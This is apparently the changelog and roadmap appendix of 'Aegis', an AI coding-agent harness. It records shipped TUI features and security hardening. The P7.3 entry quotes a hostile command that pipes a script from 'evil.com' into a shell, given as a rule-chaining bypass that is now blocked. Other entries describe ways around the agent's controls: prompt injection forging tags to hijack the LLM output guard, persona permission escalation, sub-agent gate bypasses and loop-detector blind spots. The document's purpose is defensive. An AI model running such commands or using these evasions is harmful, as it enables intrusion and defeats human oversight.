- `internal/tui/tui.go`'s `slashResultMsg` case gained the two sentinel branches: `"\x00theme-show"`
  prints `m.cfg.Theme`, and `"\x00theme <name>"` calls `applyTheme(name)`, then explicitly rebuilds
  `m.th = newTheme()` and `m.renderer = newGlamourRenderer(m.rendererW)` before `m.refresh()` — the
  step this item actually needed, since `colorScheme`'s runtime-safety alone doesn't repaint
  anything already built. `applyTheme` and `Run` gained a `normalizeThemeName` helper so
  `m.cfg.Theme` is always canonically `"dark"` or `"light"`, never blank or an unrecognized string,
  for display purposes.
- Same known limitation as `/humor`'s toggle: already-rendered transcript content (past glamour
  output) keeps its old colors; only content rendered after the switch picks up the new scheme.
  This session only — set `tui.theme: <name>` in config to make it the default on restart.
- Tests: `internal/tui/theme_test.go` (bare-args sentinel, unknown-name rejection, valid-name
  sentinel, and a `driveUpdate`-based test proving the live switch actually flips
  `glamourStyleName`/`m.cfg.Theme`/the rendered transcript through the real `Update` path — the
  first model-level test for this whole sentinel-message convention family).

### P14.9 — SHIPPED 2026-07-06 — Keybinding discoverability

Several features are keybind-only with no slash-command equivalent — Ctrl+X terminal pane, Ctrl+T
sub-agent list, Ctrl+R session switcher, Ctrl+O thinking expand/collapse — so a user who only reads
`/help` would never find them. An F1 overlay (`renderHelpOverlay`, `internal/tui/tui.go`) already
listed every keybinding, but F1 itself is a keybind you have to already know about.

- `internal/tui/keymap.go`: extracted `keyMap.helpEntries()` (returns `[]keyHelpEntry{Key, Desc}`)
  from what was an inline slice literal duplicated as-needed — now the single source both consumers
  share, the same drift class P14.10 fixed for slash commands.
- `internal/tui/tui.go`'s `renderHelpOverlay` (the F1 overlay) now calls `m.keys.helpEntries()`
  instead of building its own copy of the list.
- `internal/tui/slash.go`'s `cmdHelp` (no-args general listing) appends a "Keyboard shortcuts (also
  shown via f1)" section built from `defaultKeyMap().helpEntries()` — reachable by typing `/help`,
  no F1 discovery step required.
- Tests: `internal/tui/help_test.go`'s `TestHelpListsKeyboardShortcuts` asserts every keymap entry's
  key string appears in `/help`'s output.

---

## Appendix A — Completed Work

<details>
<summary><strong>P2 — all 9 items shipped 2026-07-01</strong></summary>

- P2.1 Ripgrep + `ls` directory tree tool
- P2.2 Bang `!` shell mode in TUI
- P2.3 Frecency-ranked @mention file autocomplete
- P2.4 File-change tracking in sidebar
- P2.5 Subagent footer strip
- P2.6 Max-step graceful degradation
- P2.7 Proactive context compaction (85% headroom check)
- P2.8 Conversation timeline dialog (`/timeline`)
- P2.9 Workflow agent primitives (sequential / parallel / loop)

</details>

<details>
<summary><strong>P3 — all 6 items shipped 2026-07-02</strong></summary>

- P3.1 Tiered long-term memory — SQLite FTS5 entity store (`internal/longmem`); `entity_remember` / `entity_recall` tools; ADK `BaseMemoryService`-compatible interface
- P3.2 Async/background task execution — `/detach` TUI command; daemon persists session to `bg_events` table; `aegis bg list/events` CLI; detached context survives TUI disconnect
- P3.3 DeepWiki-style project knowledge base — SQLite FTS5 index of docs/comments (`internal/knowledge`); `project_knowledge` tool with BM25 ranking and snippet extraction
- P3.4 Automatic rollback on tool failure — `git_sha` captured per checkpoint; `/rollback` TUI command runs `git reset --hard <sha>`; `GitRollback` flag on `RewindRequest`
- P3.6 Typed tool output schemas — optional `OutputSchemer` interface on `Tool`; `OutputSchema json.RawMessage` on `ToolSchema`; all built-in tools declare output schemas
- P3.7 Animation pause off-screen — spinner tick suppressed when `followBottom` is false; animation resumes automatically on scroll-back

</details>

<details>
<summary><strong>P4 — Core Harness Parity, all 6 items shipped 2026-07-02</strong></summary>

- P4.3 Skills progressive disclosure — `internal/skills` now injects a compact `<skills_available>` index (name + frontmatter `description:`); a `skill` builtin tool loads the full body on demand. Description-less skills fall back to eager injection.
- P4.3 extension (2026-07-04) — five skills embedded in the binary (content-review, html-report ported from `.aegis/skills`; security-audit, architecture-diagram, debug-investigation newly written) via `go:embed` in `internal/skills/builtin`, materialized to `<data_dir>/builtin-skills/` at daemon startup. Dormant by default (zero system-prompt cost); enabled per-name via `skills.builtin_enabled` config (project overrides global overrides built-in on a name collision), `aegis skills enable|disable|list` CLI, or `/skills enable|disable <name> [global]` TUI. Also fixed: `internal/memory`'s `loadSkills()` was eagerly re-injecting full (unstripped-frontmatter) skill bodies into the system prompt in parallel with `skills.BuildIndex`, which both duplicated bundled-skill content and silently bypassed progressive disclosure for any flat `.md` skill file with a `description:` — removed, `internal/skills` is now the single injection path.
- P4.4 User-configurable lifecycle hooks — `hooks:` config maps `pre_tool_use`/`post_tool_use`/`session_start`/`stop`/`subagent_stop` to shell commands (`internal/hooks` `Exec`); JSON event on stdin, exit 2 vetoes with stderr surfaced.
- P4.5 Headless structured output — `aegis chat --output-format text|json|stream-json`.
- P4.6 Deferred tool loading — `tool.Registry` gained `RegisterDeferred`/`Deferred`/`Load`/`SearchDeferred`; niche tools (latex, diagram, cron, lsp, longmem, team) are advertised as a `<deferred_tools>` one-liner and loaded via the `tool_search` meta-tool.
- P4.7 OS-level sandbox — `sandbox.backend: os` confines the local shell via macOS seatbelt / Linux bwrap; reported by `aegis sandbox detect`.
- P4.8 Close the loop — `git_pr` tool pushes the branch and opens a PR via `gh`, with a GitHub compare-URL fallback.

</details>

<details>
<summary><strong>P5 — all 9 items shipped 2026-07-02</strong></summary>

- P5.1 Agent teams — SQLite-backed shared task list (`swarm.TaskList`, `team_task_*` tools with atomic claim) + peer messaging (`team_send`/`team_inbox` over the file mailbox).
- P5.2 LSP tools — added `definition`, `hover`, `document_symbols`, `workspace_symbols`, `call_hierarchy` (registered deferred).
- P5.3 Pluggable web search — `search:` config selects brave/tavily/searxng; DuckDuckGo scrape remains the zero-config fallback.
- P5.4 Background notifications — `notify:` config fires desktop (osascript/notify-send/toast) and/or webhook on background-session completion/error.
- P5.5 @file#L10-40 line-range mentions — server expands `@path#L10-40` tokens in user messages to inline file excerpts before the engine call.
- P5.6 Draft stash — unsent textarea content saved to `.aegis/stash.json` on quit; restored on next session start.
- P5.7 Bundle install from git URL — `aegis bundle install/info <git-url>` clones `--depth=1` to temp dir and installs as a normal local bundle.
- P5.8 Semantic recall layer — `internal/embed` (Ollama `/api/embed` client, cosine similarity, reciprocal-rank fusion); `knowledge.Store` and `longmem.Store` gained an optional `Embedder` and a `docs_vec`/`mem_vec` BLOB vector table; `Search`/`SearchMemory` fuse BM25 + semantic rankings via RRF when `embeddings.enabled: true`, else BM25-only (default). `aegis knowledge index` CLI command added. Along the way, fixed a real gap: `knowledge.Store`/`longmem.Store` were built but never opened by the daemon — `project_knowledge`/`entity_remember`/`entity_recall` were dead tools; now wired into `internal/server`.
- P5.9 Provider failover — `provider.WithFailover` chains a primary adapter with ordered fallback targets, switching only on synchronous Stream failure after each target's own retry budget is exhausted (never mid-stream, so no partial output is replayed). `provider.fallback` config (ordered provider/model/base_url entries) + `provider.allow_cloud_fallback` guard: local→cloud failover is skipped with a warning unless explicitly opted in; cloud→cloud and any→local are never gated. `providerfactory.Build` assembles the chain.

</details>

<details>
<summary><strong>P7.1 — MCP capability laundering fixed, shipped 2026-07-03</strong></summary>

- `mcp.ServerConfig` gained `capability` (per-server default) and `tool_capabilities` (per remote tool name override) config fields; `internal/config.MCPServerConfig` and `internal/server` wiring pass them through.
- `internal/mcp/tool.go`: `mcpTool`/`mcpResourceListTool`/`mcpResourceReadTool`/`mcpPromptListTool`/`mcpPromptGetTool` all carry a resolved `tool.Capability` field instead of hardcoding `tool.CapNetwork`; `resolveCapability`/`parseCapability` default anything unlabeled/unrecognized to `tool.CapExecute` (most restrictive), matching the existing `internal/plugins` process-tool pattern.
- Net effect: an unlabeled or untrusted MCP server's tools now hit the `Ask` gate in build mode and are denied outright in plan mode, instead of the always-allowed `network` capability. Trusted servers opt back into `network` (or any other class) explicitly per-server or per-tool.
- Tests: `internal/mcp/mcp_test.go` — `TestParseCapabilityDefaultsToExecute`, `TestResolveCapabilityPerToolOverride`, `TestResolveCapabilityDefaultsExecuteWithNoConfig`.
- Docs updated: `docs/configuration.md` (MCP server example with `capability`/`tool_capabilities`), `docs/security.md` (`egress_then_write` network-capability description).

</details>

<details>
<summary><strong>P7.2–P7.7 — remaining security-hardening audit items, shipped 2026-07-03</strong></summary>

- **P7.2 (shell env leak):** `internal/sandbox/env.go` (new) strips `ANTHROPIC_API_KEY`/`OPENAI_API_KEY` (`DefaultStripEnv`) from `cmd.Env` in both `LocalBackend` and `OSBackend` (`local.go`, `os_sandbox.go`); `sandbox.strip_env` config (`config.SandboxConfig.StripEnv`) adds more names (e.g. MCP tokens from `.aegis/.env`) via `NewLocalBackendWithEnv`/`NewOSBackend`'s new param. Container backend untouched — `docker run`/`podman run` never passed host env into the container to begin with.
- **P7.3 (exec allow-rule chaining bypass):** `internal/permission/rules.go` adds `globToRegexpExec` — for an `allow` rule scoping an execute-capability tool, `*`/`?` cannot span shell chaining/substitution chars (`;&|`+"`"+`$()<>`+ newline), so`allow bash(npm test*)`no longer matches`npm test && curl evil.com|sh`. Deny rules deliberately keep the original broad `.*` (over-matching on deny is safe).
- **P7.4 (silent sandbox fallback):** sandbox backend selection extracted to standalone `server.selectSandbox` (testable in isolation); `sandbox.strict` config makes a failed `container`/`os` backend init a hard startup error instead of silently falling back to local. Non-strict fallback is recorded on `Server` and surfaced via `/healthz` (`api.HealthStatus.SandboxFallback`); `client.Status()` + `cli.warnSandboxFallback` print a warning banner in the TUI/`aegis ui` before entering a session.
- **P7.5 (persona mode escalation):** `persona.Persona` gained a `Loaded bool` field (true only for `*.md`-parsed personas, never built-ins); `server.resolveSessionMode` ignores a loaded persona's `mode: auto` when it's more permissive than the configured default and the caller didn't explicitly request a mode, logging a warning instead. Built-in personas remain fully trusted.
- **P7.6 (no bundle provenance check):** `bundle.Bundle.ContentHash()` computes a deterministic `sha256:`-prefixed digest over the manifest + every artifact file; `aegis bundle info` prints it, `aegis bundle install --expect-sha256 <hash>` aborts before writing anything on mismatch. Trust-on-first-use pinning, not a signature.
- **P7.7 (silent no-op deny rules):** `permission.WarnUnmatchableRules` (called once at startup against `tool.Registry.All()`, a new method) flags any non-`*`-pattern rule targeting a tool whose input schema has none of `subjectFor`'s recognized fields (`command`/`path`/`file_path`/`url`/`query`/`pattern`) — such a rule can never match, so it's logged instead of silently no-op'ing.
- Docs: `docs/configuration.md`, `docs/security.md`, `docs/permissions.md`, `docs/personas.md`, `docs/extensibility.md` all updated with the new config knobs/flags and their security rationale.

</details>

<details>
<summary><strong>P8 — Performance audit findings, all 6 items shipped 2026-07-03</strong></summary>

- **P8.1 (session store O(N²) rewrite):** `internal/session/session.go` gained `session_messages`/`session_traces` row-per-message/row-per-trace tables. `AppendMessages` (new) and `AppendTraces` (rewritten) now pure-`INSERT` new rows keyed by an incrementing `seq`, no more read-modify-write of the whole blob; `SaveMessages` keeps full-replace semantics (delete + reinsert) for the rewind/truncation case where earlier history itself changes. A one-time `migrateLegacyBlobs` backfills any pre-P8.1 whole-blob `messages`/`traces` columns into the row tables on first `Open()` after upgrade, then zeroes the legacy columns so it's a no-op on every later startup. `engine.Conversation` gained a `Persisted int` field (count of already-durable leading messages; `-1` means "rewritten in place, must fully re-save") that `repairOrphanedToolUses`/compaction reset via a new `invalidate()` helper; `server.go`'s per-turn save now calls `AppendMessages(conv.Messages[conv.Persisted:])` on the common path and only falls back to full `SaveMessages` when history was actually rewritten this turn. `Delete`/`Prune` clean up the new row tables too.
- **P8.2 (knowledge search full-corpus load):** `internal/knowledge/knowledge.go`'s `semanticRanking` now queries `docs_vec` (path+vector only) for the scoring pass, then a new `fetchSnippets` runs a second `WHERE path IN (...)` query for just the top-K survivors' title/body — no more pulling every document's full body into memory to rank.
- **P8.3 (swarm mailbox unbounded growth):** `internal/swarm/mailbox.go`'s `MarkRead` now moves the message file into a `processed/` subdirectory (instead of rewriting its `read` flag in place); `ReadAll(unreadOnly=true)` — the hot poll path used by the `team_inbox` tool — only lists the inbox directory, which now shrinks as messages are consumed instead of growing forever. `ReadAll(false)` still merges in `processed/` for full-history callers.
- **P8.4 (token estimation double-scan):** `engine.Conversation` gained a cached `estimatedChars()`/`charCountValid` pair; `Append` updates the cache incrementally, and anything that rewrites history calls the same `invalidate()` used by P8.1 to force a full recompute on next access. The two `estimateTokens` call sites (proactive-compaction check, zero-usage fallback) now share one scan per turn instead of two, and normal turns pay zero extra scan cost.
- **P8.5 (memory relevance TF-IDF recompute):** `internal/memory/relevance.go` gained `cachedEntries()` / `relevanceSnapshot`, keyed on a cheap `entriesSignature()` fingerprint (mtime+size per memory/skill file, no content read) stored on the existing `sourcesCache` (from `NewSources`); `allEntries()`/document-frequency build only reruns when a source file actually changed. `LoadRelevant` copies the cached entries before scoring so concurrent/sequential queries never mutate the shared cache.
- **P8.6 (execLock over-serializes reads):** `internal/engine/engine.go`'s `runTools` swapped `execLock sync.RWMutex` for a plain `sync.Mutex` taken only by write/execute tool calls; read/network calls no longer take any lock and run fully concurrently with a same-round write/execute call instead of blocking behind it.
- Tests: `internal/session/session_test.go` (`TestAppendMessagesIsIncremental`, `TestAppendMessagesMissingSession`, `TestSaveMessagesTruncates`, `TestDeleteRemovesMessageAndTraceRows`, `TestLegacyBlobMigration`), `internal/swarm/mailbox_test.go` (`TestMarkReadEvictsFromInbox`), `internal/memory/relevance_test.go` (`TestLoadRelevantCacheInvalidatesOnFileChange`).

</details>

<details>
<summary><strong>P9.1/P9.2/P9.5 — Eval harness, test coverage, spend caps, shipped 2026-07-03</strong></summary>

- **P9.1 (eval/regression harness):** new `internal/eval` package. A `Scenario` (system prompt + fully-built `engine.Options` + a sequence of user turns) runs against a real `engine.Engine` wired with a scripted/deterministic `provider.Adapter` — no live model, so it's part of `go test ./...` with no API key required. `Check` functions (`ExpectToolCalled`, `ExpectToolNotCalled`, `ExpectNoError`, `ExpectErrorContains`, `ExpectFinalTextContains`) assert on the `Result`; `AssertGolden` pins a deterministic JSON transcript per scenario under `internal/eval/testdata/`, regenerated via `AEGIS_EVAL_UPDATE=1 go test ./internal/eval/...`. Four scenarios ship as the initial suite (`internal/eval/scenarios_test.go`): a tool-call round trip (golden-pinned), plan-mode denying a write tool before `Execute` ever runs, a cost-budget abort stopping before its second turn, and multi-turn conversation continuity across two user turns. This exercises the interaction between engine, permission gate, and tool registry the way a real session would — regressions that only show up when those mechanisms combine won't necessarily trip a narrower per-mechanism unit test.
- **P9.2 (test coverage for trace/logging/api/client):** `internal/trace`, `internal/logging`, `internal/api`, `internal/client` all gained `_test.go` files (previously zero coverage). `internal/api`'s tests lock the on-the-wire `EventKind` strings and round-trip every wire type, since a silent rename there breaks the TUI/CLI without a compile error. Writing `internal/logging`'s tests surfaced a real bug: `ToStderr: true` with a `Path` set was replacing file output with stderr-only instead of mirroring both (contradicting the field's own doc comment) — fixed with `io.MultiWriter`, which is what `aegis serve --foreground` needs to keep a durable log file while also printing to the terminal.
- **P9.5 (spend caps):** `internal/config.CostConfig` gained `session_cap_usd` and `daily_cap_usd` (0 = unlimited, same convention as the existing `budget_usd`) plus `alert_threshold` (fraction, default 0.8). `internal/session.Store` gained a `daily_cost` table (`AddDailyCost`/`TodayCost`, keyed by UTC date) since the existing per-session `cost_usd` column can't answer "how much across all sessions today." `server.handlePostMessage` checks both caps before starting a turn (rejecting with 402 rather than the existing mid-run `budget_usd` abort, which is per-turn only) and emits a new `api.KindCostAlert` SSE event the turn that crosses `alert_threshold` of either cap (rendered in the TUI like the existing guard warning). This is additive to the pre-existing `budget_usd` single-run abort, not a replacement.
- Tests: `internal/eval/scenarios_test.go` (4 scenarios + golden transcript), `internal/api/api_test.go`, `internal/trace/trace_test.go`, `internal/logging/logging_test.go`, `internal/client/client_test.go`, `internal/session/session_test.go` (`TestTodayCostDefaultsToZero`, `TestAddDailyCostAccumulates`), `internal/server/server_test.go` (`TestSessionCostCapBlocksTurn`, `TestDailyCostCapBlocksTurn`, `TestCostAlertThresholdFires`).

</details>

<details>
<summary><strong>Persona QoL pass — advisory tool gate, CLI, default persona, shipped 2026-07-03</strong></summary>

Not a numbered roadmap item — a follow-through pass closing gaps left by the P7.5 persona-trust model and earlier persona hot-reload/full-profile-switch work.

- **`permission.PersonaToolGate`** (`internal/permission/persona_tools.go`, new): wraps the base gate with an advisory check against a persona's declared `Tools` list. Deliberately not a security boundary (same trust model as P7.5) — a tool call outside the list is logged and routed through the session's `Approver`: a non-interactive approver (e.g. auto mode) warns and allows, the TUI's interactive approver prompts and reuses its session-scoped allow-always cache. Declining blocks that call; approving (or an empty `Tools` list) always falls through to the real base gate.
- **`aegis persona` CLI** (`internal/cli/persona.go`, new): `list` (built-in/custom/default markers), `show <name>` (source, model, mode, tools, rules, guard, prompt; `--full` for the entire prompt), `new <name>` (scaffolds a commented frontmatter template, `--global` for the user directory), `use <name>` (writes `default_persona` to project or `--global` user config).
- **`default_persona` config** (`internal/config`): a new session with no explicit `--persona` resolves project `default_persona` → user-global `default_persona` → `general`. `config.PatchProjectDefaultPersona`/`PatchGlobalDefaultPersona` back the CLI's `use` subcommand.
- **Full-profile mid-session persona switch**: `api.UpdateSessionRequest` gained `Persona`; `/persona` in the TUI now switches the persisted persona name (so model/rules/guard re-resolve every turn, not just the system prompt) and applies the persona's default permission mode when the user hasn't set one explicitly, reporting the mode change.
- **Output guard rubric refinement**: `DefaultGuardRubric` and the `--first-init` template now explicitly excuse clearly-marked example/placeholder values in documentation (illustrative IPs, `<your-api-key>`-style tokens) from the "no placeholders" check, since those are legitimate and the real value was never supplied to the model.
- Tests: `internal/permission/persona_tools_test.go`, `internal/cli/persona_test.go`, `internal/config/write_persona_test.go`, plus updates to `internal/persona/load_test.go`, `internal/persona/persona_test.go`, `internal/server/server_test.go`.
- Docs: `README.md`, `CLAUDE.md`, `docs/cli-reference.md`, `docs/configuration.md`, `docs/personas.md` all updated in the same commit.

</details>

<details>
<summary><strong>P6.4 — Context editing / tool-result pruning, shipped 2026-07-03</strong></summary>

`compaction.pruneStaleToolResults` (`internal/compaction/prune.go`) runs as a deterministic pre-pass inside `Summarizer.Compact`, before any LLM call: `read_file` results for a path that was read again later are blanked to a one-line marker, and large `grep`/`glob`/`ls` dumps outside the trailing `keepRecent` window are truncated to a short preview. Never touches conversational text, tool errors, or the recent window. If pruning alone brings the estimate back under budget, `Compact` returns immediately — no summarizer call, no LLM cost.

</details>

<details>
<summary><strong>P6.3 — MCP server mode, shipped 2026-07-05</strong></summary>

New `internal/mcpserver` package + `aegis mcp-serve`: exposes the Aegis daemon as an MCP server over stdio, the reverse direction of the existing `mcp:` client config (which lets Aegis call _out_ to external MCP servers). Rolls its own minimal JSON-RPC 2.0 dispatcher (request/notification, no server-initiated calls needed) rather than sharing `internal/acp`'s — same precedent as `internal/mcp`'s client-side loop already being separate from ACP's.

- Three tools exposed: `aegis_prompt` (delegate a task to a session and block for the full turn, returning the final assistant text plus a `[session: <id>]` marker to continue the conversation), `aegis_new_session`, and `aegis_list_sessions`. All three are thin translations onto the existing daemon HTTP API (`client.Client`), exactly how `internal/acp`'s agent already works — no new server-side session/engine plumbing.
- Safety posture is deliberately conservative since an MCP `tools/call` is synchronous with no human in the loop: new sessions default to **plan mode** (`mcp_server.default_mode`, not the daemon's own build default) and any approval request that does arise (a caller explicitly asked for build/auto) is **denied** unless `mcp_server.auto_approve` (or `--auto-approve`) is set.
- **Scope decisions kept deliberately narrow:** individual built-in tools (`security_scan`, `read_file`, etc.) are not exposed 1:1 as MCP tools bypassing the agent loop — undone follow-up, not an oversight. `notifications/cancelled` is not propagated to an in-flight `aegis_prompt` call.
- Verified end-to-end against a real running daemon (built the binary, drove `aegis mcp-serve` over stdio by hand: `initialize` → `tools/list` → `tools/call aegis_new_session`/`aegis_list_sessions`), not just unit-tested.

Tests: `internal/mcpserver/server_test.go` (14 cases: initialize, tools/list schema shape, prompt session-create vs. reuse, approval deny-by-default vs. auto-approve, error propagation, empty/populated session listing, unknown tool/method, notification-gets-no-response). Docs: `docs/cli-reference.md`, `docs/configuration.md`, `CLAUDE.md`.

</details>

<details>
<summary><strong>TQ — TUI Quality Track, all 11 items shipped (complete 2026-07-03)</strong></summary>

A code-level review of `internal/tui` against the Claude Code and opencode/Crush TUI experience found the recurring gap: Aegis rendered the conversation as one append-only styled string (`cappedBuffer` + wrap caches), while the streamlined harnesses model it as a list of typed message blocks rendered and cached individually. TQ1 fixed that structural gap; the rest is diff quality, streaming markdown, and interaction polish.

| #      | Item                                                                                                                                                                                                                                                                                                                                                                                                                             | Shipped    |
| ------ | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ---------- |
| TQ1    | Block-based transcript model — `internal/tui/transcript.go`: `transcriptBlock` (raw ANSI content + per-block width-keyed wrap cache) replaces the old whole-buffer `cappedBuffer`/`wrapCache`; `liveBlock` keeps the settled-prefix boundary-cache trick so a long streaming reply stays O(tail) per token. Trimming drops whole blocks instead of severing content mid-line.                                                    | 2026-07-02 |
| TQ2    | Real unified diffs — LCS-based Myers diff in `toolview.go`; context lines, `+`/`-` markers, `@@ ... @@` separators between hunks. Replaces delete-all/add-all.                                                                                                                                                                                                                                                                   | 2026-07-02 |
| TQ4a/b | Copy affordances — `/copy` copies last assistant message via `pbcopy`/`xclip`/`clip.exe`; `/copy N` copies Nth fenced code block; toast confirmation.                                                                                                                                                                                                                                                                            | 2026-07-02 |
| TQ5    | Toggleable sidebar — `sidebarOpen bool` (default off); `ctrl+b` / `/sidebar` toggle; context %, cost, agent count folded into status bar when hidden.                                                                                                                                                                                                                                                                            | 2026-07-02 |
| TQ7    | Live todo strip — intercepts `todo_add`/`todo_update`/`todo_list` tool results; renders `▣▶▢` progress strip above input with in-progress task text.                                                                                                                                                                                                                                                                             | 2026-07-02 |
| TQ3    | Streaming markdown — the live tail renders through glamour incrementally: `liveBlock.render` takes a markdown-render callback, trailing newlines normalized so settled-prefix + tail concatenation is byte-identical to a whole-source render. No end-of-turn restyle "pop".                                                                                                                                                     | 2026-07-03 |
| TQ9    | Input polish bundle — `shift+enter` newline (Kitty key disambiguation, `ctrl+j` fallback); pasted image paths become `@image:` attachment tokens (`extractImageRefs`, regex-based, quoted-path support); ↑/↓ move the cursor inside a multiline draft with history nav only at first/last line; thinking blocks collapse to `✻ thought for Ns` (`ctrl+o` to expand).                                                             | 2026-07-03 |
| TQ8    | Message queueing — `alt+enter` during streaming queues the draft as the next user turn (dimmed `⏳ queued ▸` block); queued messages auto-send one per completed run at stream close. Explicit cancel or a stream error discards the queue.                                                                                                                                                                                      | 2026-07-03 |
| TQ6    | Richer approval flow — y/a/n banner replaced by an option-list dialog (`internal/tui/approval.go`): `Allow once / Allow always for pattern / Deny / Deny with feedback`, diff/command preview. "Allow always" derives a scoped pattern (`suggestRulePattern`) and persists it to `.aegis/config.yaml → permission.rules` (`config.AppendProjectPermissionRule`). "Deny with feedback" steers the typed reason back to the model. | 2026-07-03 |
| TQ10   | Theme system — the hardcoded Charmtone palette moved behind `colorScheme` (`internal/tui/colorscheme.go`) with `darkScheme`/`lightScheme` built-ins; `tui.theme` config key applied before styles are built; glamour markdown style and ANSI-16 shell-output remap follow the scheme.                                                                                                                                            | 2026-07-03 |

Remaining cosmetic stretch ideas (not scheduled): TQ4c scoped mouse capture, terminal-background auto-detection for theme selection.

</details>

<details>
<summary><strong>Architecture/security review punch list — all 15 items shipped 2026-07-04</strong></summary>

Fixes for every item in `research/architecture-security-review-2026-07-03.md`'s prioritized punch list, an adversarial fresh-context review (five independent passes) run specifically to find interaction bugs between individually-correct features — the class of bug a checklist re-verification against P7/P8/P9 structurally can't catch. All 15 shipped in priority order; full test suite green throughout.

1. **Persona `rules:` escalation** — `server.filterPersonaRules` (new, `internal/server/server.go`) strips `Allow` rules from a loaded (untrusted) persona before merging into the session rule set, same trust gate `resolveSessionMode` already applied to `Mode` (P7.5). Deny rules pass through unchanged (narrowing access carries no escalation risk).
2. **Persona `output_guard: none` escalation** — `outputGuardConfig` now ignores `Guard.Disabled` from a loaded persona (logs a warning instead), closing the same class of gap for the last safety net.
3. **Unrecovered tool-panic crashes the daemon** — `engine.runTools`' per-call goroutine now `recover()`s a panic and reports it as an ordinary tool error, instead of taking down every concurrent session.
4. **Sub-agent fan-out multiplies spend** — a shared `*cost.Tracker` rides the run's `ctx` (`swarm.WithCostTracker`/`CostTrackerFromContext`) so every sub-agent at any depth (including background/detached spawns, and workflow-mode fan-out) draws against one `BudgetUSD` ceiling; `agent.go` also caps a `parallel` workflow at `maxParallelAgents` (8).
5. **Rewind races an in-flight turn** — `handleRewind` now acquires the same per-session semaphore `handlePostMessage` does, so a rewind can never truncate messages a concurrent turn is about to append to.
6. **Permission rules matched raw paths** — `permission.Rule` gained a `rePath` matcher; `normalizePathLike` (separator-unify + lexical clean + case-fold on case-insensitive OSes) closes the `./secrets/x`, case-variant, and backslash-vs-forward-slash evasions for Read/Write-capability rules.
7. **Transcript persistence wasn't actually incremental** — `handlePostMessage`'s `flushMessages` closure now runs on every `KindTurnDone`/`KindTrace` event (after each tool round), not once at the very end, so a crash mid-run loses at most the in-flight model call.
8. **Guard fails open on ambiguous verdicts + no injection hardening** — `parseVerdict` now fails _closed_ on an unparseable reply (an actual transport error still fails open); `LLMGuard` wraps judged content in `<output>`/`<file>` tags with `escapeForGuard` neutralizing embedded angle brackets, so injected content can't forge a fake closing tag and splice in "instructions."
9. **MCP read loops die silently on oversized/malformed input** — `readLoop`/`listenSSE` scanners raised to `maxMCPScanTokenBytes` (8 MiB, from bufio's 64KB default); `Client.failPending` fails every in-flight and future call immediately once the read loop exits, instead of hanging forever on a dead connection.
10. **OpenAI reasoning models get the wrong token-limit field** — `isReasoningModel` routes o1/o3-class models (including vendor-prefixed ids) to `max_completion_tokens` instead of `max_tokens`, which those models reject outright.
11. **OS sandbox overstates its guarantee** — `docs/security.md`/`docs/configuration.md` now document (and `OSBackend`'s doc comment states) that seatbelt/bwrap confine writes and network only, not reads — a materially weaker claim than the container backend's full isolation.
12. **Budget dead zones + loop-detector blind spot** — the budget check now runs at the top of every engine iteration (covering guard retries and max-token continuations, not just the pre-tool-round path); `loopDetector` generalizes from "last N identical" to cycle detection up to period 4 (catches an alternating A/B pattern), and `turnSignature` canonicalizes tool input (normalizing timestamp/UUID/nonce-shaped scalars) so a single varying byte can't defeat it.
13. **Tool exposure/subprocess/mailbox isolation gaps** — `tool.Registry.Clone()` + a per-session registry (`Server.sessionToolRegistry`) scope `tool_search` loads to the requesting session instead of exposing process-wide; subprocess swarm workers get a process group (`Setpgid`) plus Linux `Pdeathsig`/Windows Job Object (`JOB_OBJECT_LIMIT_KILL_ON_JOB_CLOSE`) so an abnormal daemon death doesn't orphan them; `Mailbox.MarkRead` now evicts `processed/` entries older than `processedRetention` (7 days).
14. **Embedding provenance / prune-by-age / checkpoint scope** — `mem_vec`/`docs_vec` gained a `model` column (`embed.Embedder` gained `Model()`); a stored vector from a different model is excluded from cosine ranking rather than silently compared. `compaction.pruneStaleToolResults` now only prunes a `grep`/`glob`/`ls` dump once verified superseded by an identical later call (mirrors the existing `read_file` re-read check), not merely by turn age. Checkpoint capture now reaches subprocess-mode sub-agents: `SpawnConfig.CheckpointID` + `WorkerSpec.SessionDBPath` let the worker process open its own connection to the same session db and reconstruct an equivalent `Snapshotter`.
15. **Adversarial eval suite** — `internal/eval/adversarial_test.go` (new) extends the P9.1 harness (`GuardEvents`/`ExpectGuardFailureContains` added to `eval.go`) with four full-engine scenarios: a judge-adapter proving injected file content can't hijack the output guard, a permission rule proving a `./`-traversal evasion is still blocked, loop detection proving a nonce-varying tool call still trips, and the budget gate proving a stuck guard-retry loop still aborts.

Tests: every fix above shipped with its own regression test (permission/rules_test.go, engine/parallel_test.go, engine/budget_test.go, engine/loopdetect_test.go, tool/deferred_test.go, tool/builtin/{agent,toolsearch}\_test.go, mcp/mcp_test.go, provider/openai/openai_test.go, guard/guard_test.go, server/{server_guard,server_checkpoint}\_test.go, swarm/mailbox_test.go, longmem/knowledge_test.go, compaction/prune_test.go, cli/worker_test.go, eval/adversarial_test.go) plus the new adversarial eval suite exercising several fixes together end-to-end. Full `go test ./...` green (48 packages).

</details>

<details>
<summary><strong>P10 — Sub-agent Security Parity, all 5 items shipped 2026-07-04</strong></summary>

A service-interaction review traced how a top-level session's security posture propagates across the `agent` delegation seam into a spawned teammate, and found neither swarm backend inherited it: `server.newEngine` composes the real gate stack for a top-level run (`RuleGate` → `ContextualGate` → `PersonaToolGate` → mode gate), but `subAgentRunner` (in-process) and `executeWorker` (subprocess) both rebuilt only a bare mode gate from scratch. Mode clamping still held in both paths, so a sub-agent couldn't _escalate_ plan→build→auto — what leaked was everything finer-grained than mode.

- **P10.1 (in-process bypass):** `subAgentRunner` skipped the contextual-egress and text allow/deny rule wrapping entirely — a spawned teammate's `web_fetch`/`curl` calls ignored an operator's `egress_then_write`/deny rules. Fixed by factoring gate assembly out of `newEngine` into `(*Server).buildGate(mode, approver, persona)`, reused by both the top-level and sub-agent paths.
- **P10.2 (subprocess unsandboxed + same gate bypass):** `executeWorker` built its tool registry with no `Sandbox` at all (so a configured container/os sandbox was silently never honored for subprocess workers) and the identical bare-mode-gate bypass as P10.1. Fixed via newly-exported `server.SelectSandbox` plus layering the same contextual/rule gates, independently re-loaded from config since a subprocess has no access to the daemon's in-memory state.
- **P10.3 (subprocess budget multiplication):** each subprocess worker got a fresh full `BudgetUSD` instead of sharing the parent's ledger (which can't ride `ctx` across a process boundary), so N teammates enforced N× the intended ceiling. Fixed with a `RemainingBudgetUSD`/`RemainingTokens` handoff on `WorkerSpec`, sized against the shared tracker at spawn time, and `cost.Tracker.AddWorkerCost` folding each worker's self-reported spend back before the next sibling spawns.
